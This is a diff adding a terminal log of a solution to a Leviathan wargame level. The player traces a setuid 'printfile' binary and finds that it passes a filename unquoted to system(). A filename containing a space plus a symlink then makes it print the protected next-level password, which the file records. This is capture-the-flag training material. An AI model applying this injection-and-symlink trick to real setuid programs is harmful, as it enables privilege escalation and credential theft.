@@ -1,0 +1,63 @@
+f0n8h2iWLP for Leviathan3
+
+leviathan2@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Jun 20 04:07 .
+drwxr-xr-x 83 root       root        4096 Jun 20 04:08 ..
+-rw-r--r--  1 root       root         220 Mar 31 08:41 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31 08:41 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2 15068 Jun 20 04:07 printfile
+-rw-r--r--  1 root       root         807 Mar 31 08:41 .profile
+leviathan2@gibson:~$ ./printfile 
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@gibson:~$ ./printfile password
+You cant have that file...
+leviathan2@gibson:~$ ltrace ./printfile 
+__libc_start_main(0x80490ed, 1, 0xffffd484, 0 <unfinished ...>
+puts("*** File Printer ***"*** File Printer ***
+)                                                            = 21
+printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
+)                                           = 28
++++ exited (status 255) +++
+leviathan2@gibson:~$ ./printfile password.txt
+You cant have that file...
+leviathan2@gibson:~$ mkdir /tmp/nish && touch /tmp/nish/test.txt
+leviathan2@gibson:~$ cd /tmp/nish
+leviathan2@gibson:/tmp/nish$ ltrace ~/printfile test.txt
+__libc_start_main(0x80490ed, 2, 0xffffd444, 0 <unfinished ...>
+access("test.txt", 4)                                                                   = 0
+snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt")                           = 17
+geteuid()                                                                               = 12002
+geteuid()                                                                               = 12002
+setreuid(12002, 12002)                                                                  = 0
+system("/bin/cat test.txt" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                  = 0
++++ exited (status 0) +++
+leviathan2@gibson:/tmp/nish$ touch pass\ file.txt
+leviathan2@gibson:/tmp/nish$ ltrace ~/printfile "pass file.txt" 
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+access("pass file.txt", 4)                                                              = 0
+snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt")                 = 22
+geteuid()                                                                               = 12002
+geteuid()                                                                               = 12002
+setreuid(12002, 12002)                                                                  = 0
+system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
+/bin/cat: file.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                  = 256
++++ exited (status 0) +++
+leviathan2@gibson:/tmp/nish$ ln -s /etc/leviathan_pass/leviathan3 /tmp/nish/pass
+leviathan2@gibson:/tmp/nish$ ls -la
+total 44
+drwxrwxr-x   2 leviathan2 leviathan2  4096 Jun 23 20:45 .
+drwxrwx-wt 823 root       root       36864 Jun 23 20:46 ..
+lrwxrwxrwx   1 leviathan2 leviathan2    30 Jun 23 20:45 pass -> /etc/leviathan_pass/leviathan3
+-rw-rw-r--   1 leviathan2 leviathan2     0 Jun 23 20:44 pass file.txt
+-rw-rw-r--   1 leviathan2 leviathan2     0 Jun 23 20:41 test.txt
+leviathan2@gibson:/tmp/nish$ ~/printfile "pass file.txt" 
+f0n8h2iWLP
+/bin/cat: file.txt: No such file or directory
+leviathan2@gibson:/tmp/nish$
